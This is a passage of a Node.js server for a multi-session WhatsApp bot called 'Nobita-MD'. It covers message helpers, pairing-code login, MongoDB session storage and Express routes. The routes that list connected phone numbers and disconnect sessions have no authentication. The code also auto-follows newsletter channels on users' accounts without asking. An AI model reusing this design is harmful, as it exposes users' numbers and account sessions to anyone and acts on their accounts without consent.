        mimetype,
        fileName,
        ...options,
      },
      { quoted, ...options }
    );
    return fs.promises.unlink(pathFile);
  };

  conn.parseMention = async (text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map((v) => v[1] + "@s.whatsapp.net");
  };

  conn.sendMedia = async (jid, path, fileName = "", caption = "", quoted = "", options = {}) => {
    let types = await conn.getFile(path, true);
    let { mime, ext, res, data, filename } = types;
    if (res && res.status !== 200 || file.length <= 65536) {
      try {
        throw { json: JSON.parse(file.toString()) };
      } catch (e) {
        if (e.json) throw e.json;
      }
    }
    let type = "",
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = "document";
    if (options.asSticker || /webp/.test(mime)) {
      const exifModule = await import('./exif.js');
      const { writeExif } = exifModule.default || exifModule;
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, {
        packname: options.packname ? options.packname : config.packname,
        author: options.author ? options.author : config.author,
        categories: options.categories ? options.categories : [],
      });
      await fs.promises.unlink(filename);
      type = "sticker";
      mimetype = "image/webp";
    } else if (/image/.test(mime)) type = "image";
    else if (/video/.test(mime)) type = "video";
    else if (/audio/.test(mime)) type = "audio";
    else type = "document";
    await conn.sendMessage(
      jid,
      {
        [type]: { url: pathFile },
        caption,
        mimetype,
        fileName,
        ...options,
      },
      { quoted, ...options }
    );
    return fs.promises.unlink(pathFile);
  };

  conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
  };

  conn.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
  };

  conn.sendTextWithMentions = async (jid, text, quoted, options = {}) =>
    conn.sendMessage(
      jid,
      { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map((v) => v[1] + "@s.whatsapp.net") }, ...options },
      { quoted }
    );

  conn.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
      ? Buffer.from(path.split`,`[1], "base64")
      : /^https?:\/\//.test(path)
      ? await (await getBuffer(path))
      : fs.existsSync(path)
      ? fs.readFileSync(path)
      : Buffer.alloc(0);
    return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  conn.sendText = (jid, text, quoted = "", options) => conn.sendMessage(jid, { text: text, ...options }, { quoted });

  conn.sendButtonText = (jid, buttons = [], text, footer, quoted = "", options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options,
    };
    conn.sendMessage(jid, buttonMessage, { quoted, ...options });
  };

  conn.send5ButImg = async (jid, text = "", footer = "", img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
    var template = generateWAMessageFromContent(
      jid,
      proto.Message.fromObject({
        templateMessage: {
          hydratedTemplate: {
            imageMessage: message.imageMessage,
            hydratedContentText: text,
            hydratedFooterText: footer,
            hydratedButtons: but,
          },
        },
      }),
      options
    );
    conn.relayMessage(jid, template.message, { messageId: template.key.id });
  };

  conn.getName = (jid, withoutContact = false) => {
    id = conn.decodeJid(jid);
    withoutContact = conn.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name.notify || v.subject)) v = conn.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === conn.decodeJid(conn.user.id.split(':')[0] + "@s.whatsapp.net")
          ? conn.user
          : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  conn.sendContact = async (jid, kon, quoted = "", opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await conn.getName(i + "@s.whatsapp.net"),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + "@s.whatsapp.net")}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/khan-xd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    conn.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted }
    );
  };

  conn.setStatus = (status) => {
    conn.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status",
      },
      content: [
        {
          tag: "status",
          attrs: {},
          content: Buffer.from(status, "utf-8"),
        },
      ],
    });
    return status;
  };

  conn.serializeM = (mek) => sms(conn, mek);
}

async function getSizeMedia(buffer) {
  return buffer.length;
}

// ===============================
// MAIN PAIR FUNCTION
// ===============================
async function EmpirePair(number, res) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');

    if (activeSockets.has(sanitizedNumber)) {
        if (res && !res.headersSent) {
            return res.status(200).send({
                status: 'already_connected',
                message: 'This number is already connected'
            });
        }
        return activeSockets.get(sanitizedNumber);
    }

    if (!checkMaxSessionsLimit()) {
        if (res && !res.headersSent) {
            return res.status(429).send({
                error: 'Maximum sessions limit reached',
                message: `Maximum ${MAX_ACTIVE_SESSIONS} active sessions allowed.`
            });
        }
        return null;
    }

    const sessionPath = path.join(SESSION_BASE_PATH, `session_${sanitizedNumber}`);

    const restoredCreds = await getSessionFromMongoDB(sanitizedNumber);
    if (restoredCreds) {
        fs.ensureDirSync(sessionPath);
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(restoredCreds, null, 2));
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    try {
        const conn = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),
            syncFullHistory: false,
            browser: Browsers.windows('Chrome'),
            version,
        });

        await addConnectionFunctions(conn);
        socketCreationTime.set(sanitizedNumber, Date.now());

        let userConfig;
        try {
            userConfig = await loadUserConfig(sanitizedNumber);
            userConfig = { ...config.DEFAULT_SETTINGS, ...userConfig };
        } catch (error) {
            userConfig = { ...config.DEFAULT_SETTINGS };
        }

        conn.userConfig = userConfig;
        setupMessageHandlers(conn, sanitizedNumber, userConfig);
        setupCombinedHandlers(conn, userConfig);
        setupAntiDeleteHandler(conn);
        conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

        const credsUpdateListener = async () => {
            try {
                await saveCreds();
                await delay(500);
                const credsPath = path.join(sessionPath, 'creds.json');
                if (fsSync.existsSync(credsPath)) {
                    const fileContent = await fs.readFile(credsPath, 'utf8');
                    if (fileContent && fileContent.trim().length > 0) {
                        try {
                            const sessionData = JSON.parse(fileContent);
                            await saveSessionToMongoDB(sanitizedNumber, sessionData);
                        } catch (parseError) {}
                    }
                }
            } catch (error) {}
        };

        conn.ev.on('creds.update', credsUpdateListener);
        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'open') {
                try {
                    await delay(3000);
                    try {
                        await followNewsletterChannels(conn);
                    } catch (error) {}

                    try {
                        await saveUserConfigToMongoDB(sanitizedNumber, userConfig);
                        await saveNumberToMongoDB(sanitizedNumber);
                        activeSockets.set(sanitizedNumber, conn);
                        sessionStartedAt.set(sanitizedNumber, Date.now());

                        const startMess = `🤖 * 𓆩Nobita-MD𓆪 Aᴄᴛɪᴠᴀᴛᴇᴅ*

- Type .menu for commands

> *OWNER: Hamid-Fida*
> *DEVELOPER: 𓆩𝐁𝐀𝐆𝐆𝐀_𝐒𝐇𝐄𝐑_𝐌𝐃𓆪*`;
                            

                        try {
                            await conn.sendMessage(
                                conn.user.id.split(':')[0] + "@s.whatsapp.net",
                                {
                                    image: { url: config.IK_IMAGE_PATH },
                                    caption: startMess
                                },
                                { disappearingMessagesInChat: true, ephemeralExpiration: 100 }
                            );
                        } catch (imageError) {
                            await conn.sendMessage(
                                conn.user.id.split(':')[0] + "@s.whatsapp.net",
                                { text: startMess },
                                { disappearingMessagesInChat: true, ephemeralExpiration: 100 }
                            );
                        }

                    } catch (error) {}

                } catch (error) {
                    exec(`pm2 restart ${process.env.PM2_NAME || 'session'}`);
                }
            }

            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;

                if (statusCode !== 408) {
                    await delay(10000);
                    activeSockets.delete(sanitizedNumber);
                    socketCreationTime.delete(sanitizedNumber);
                    sessionStartedAt.delete(sanitizedNumber);
                    const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
                    await EmpirePair(number, mockRes);
                }
            }
        });

        if (!conn.authState.creds.registered) {
            let retries = config.MAX_RETRIES;
            let code;
            while (retries > 0) {
                try {
                    await delay(1500);
                    code = await conn.requestPairingCode(sanitizedNumber);
                    break;
                } catch (error) {
                    retries--;
                    if (retries === 0) throw error;
                    await delay(2000 * (config.MAX_RETRIES - retries));
                }
            }

            if (res && !res.headersSent) {
                return res.send({ code });
            }
        }

        return conn;
    } catch (error) {
        socketCreationTime.delete(sanitizedNumber);
        if (res && !res.headersSent) {
            res.status(503).send({
                error: 'Service Unavailable',
                message: 'Failed to pair. Please try again.'
            });
        }
        throw error;
    }
}

async function autoReconnectFromMongoDB() {
    try {
        const numbers = await getAllNumbersFromMongoDB();
        if (!Array.isArray(numbers)) return;

        const currentSessions = activeSockets.size;
        const availableSlots = MAX_ACTIVE_SESSIONS - currentSessions;

        if (availableSlots <= 0) return;

        const numbersToReconnect = numbers.slice(0, availableSlots);

        for (const number of numbersToReconnect) {
            if (activeSockets.has(number)) continue;

            const mockRes = {
                headersSent: false,
                send: () => {},
                status: () => mockRes
            };
            await EmpirePair(number, mockRes);
            await delay(1000);
        }
    } catch (error) {}
}

// ===============================
// EXPRESS ROUTES
// ===============================
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "lib")));

app.get("/", (req, res) => {
    const mainHtmlPath = path.join(__dirname, "lib", "main.html");
    if (fs.existsSync(mainHtmlPath)) {
        res.sendFile(mainHtmlPath);
    } else {
        res.sendFile(path.join(__path, 'main.html'));
    }
});

app.get('/code', async (req, res) => {
    const { number } = req.query;
    if (!number) {
        return res.status(400).send({ error: 'Number parameter is required' });
    }

    const sanitizedNumber = number.replace(/[^0-9]/g, '');

    if (activeSockets.size >= MAX_ACTIVE_SESSIONS) {
        return res.status(429).send({
            error: 'Maximum sessions limit reached',
            message: `Maximum ${MAX_ACTIVE_SESSIONS} active sessions allowed. Please try again later.`,
            current_sessions: activeSockets.size,
            max_sessions: MAX_ACTIVE_SESSIONS
        });
    }

    try {
        await EmpirePair(number, res);
    } catch (error) {
        console.error('Pairing route error:', error);
        if (!res.headersSent) {
            res.status(500).send({
                error: 'Failed to generate pairing code',
                message: 'Please try again or check your number format'
            });
        }
    }
});

app.get('/status', (req, res) => {
    const { number } = req.query;
    if (!number) {
        const list = Array.from(activeSockets.keys()).map((n) => ({ number: n, ...connectionStatus(n) }));
        return res.json({ totalActive: activeSockets.size, connections: list });
    }
    res.json({ number, ...connectionStatus(number) });
});

app.get('/disconnect', async (req, res) => {
    const { number } = req.query;
    if (!number) return res.status(400).json({ error: 'Number required' });
    const n = number.replace(/[^0-9]/g, '');
    const socket = activeSockets.get(n);
    if (!socket) return res.status(404).json({ error: 'Not found' });
    try {
        await socket.ws.close();
        socket.ev.removeAllListeners();
        activeSockets.delete(n);
        sessionStartedAt.delete(n);
        socketCreationTime.delete(n);

        await deleteSessionFromMongoDB(n);
        await deleteNumberFromMongoDB(n);
        await deleteConfigFromMongoDB(n);

        connectMsgSentFor.delete(n);
        reconnectAttempts.delete(n);
        userWarnings.delete(n);
        res.json({ status: 'success', message: 'Disconnected. All data deleted.' });
    } catch (e) {
        res.status(500).json({ error: 'Failed to disconnect' });
    }
});

app.get('/active', (req, res) => {
    res.json({ count: activeSockets.size, numbers: Array.from(activeSockets.keys()) });
});

app.get('/ping', (req, res) => {
    res.json({
        status: 'active',
        message: `${config.BOT_NAME} is running 🔥`,
        activeSessions: activeSockets.size
    });
});

app.get('/connect-all', async (req, res) => {
    try {
        const numbers = await getAllNumbersFromMongoDB();
        const results = [];
        for (const number of numbers) {
            const sanitized = number.replace(/[^0-9]/g, '');
            if (activeSockets.has(sanitized)) {
                results.push({ number: sanitized, status: 'already_connected' });
                continue;
            }
            const mockRes = { headersSent: true, json: () => {}, status: () => mockRes };
            await EmpirePair(sanitized, mockRes).catch(() => {});
            results.push({ number: sanitized, status: 'connection_initiated' });
            await delay(1000);
        }
        res.json({ status: 'success', total: numbers.length, connections: results });
    } catch (e) {
        res.status(500).json({ error: 'Failed' });
    }
});

// ===============================
// PROCESS HANDLER
// ===============================
process.on('exit', async () => {
    activeSockets.forEach((conn, number) => {
        if (conn && conn.ws) {
            conn.ws.close();
        }
        activeSockets.delete(number);
        socketCreationTime.delete(number);
    });

    if (mongoClient) {
        await mongoClient.close();
    }

    fs.emptyDirSync(SESSION_BASE_PATH);
});

// ===============================
// START SERVER — PORT FIRST, THEN PLUGINS, THEN MONGODB
// ===============================
async function startServer() {
    const PORT = process.env.PORT || 8000;

    // 1️⃣ Bind port FIRST so Heroku doesn't SIGTERM the dyno
    app.listen(PORT, () => {
        console.log(`🚀 Server running on: http://localhost:${PORT}`);
    });

    // 2️⃣ Load plugins (non-blocking)
    loadPlugins()
        .then(() => console.log('✅ Plugins loaded'))
        .catch((err) => console.error('❌ Plugin load failed:', err.message));

    // 3️⃣ Connect MongoDB (non-blocking), then start auto-reconnect
    connectMongoDB()
        .then(() => {
            console.log('✅ MongoDB ready, starting auto-reconnect');
            setInterval(autoReconnectFromMongoDB, 5 * 60 * 1000);
            setTimeout(() => autoReconnectFromMongoDB().catch(() => {}), 5000);
        })
        .catch((err) => {
            console.error('❌ MongoDB failed to connect:', err.message);
        });
}

startServer();

export default app;
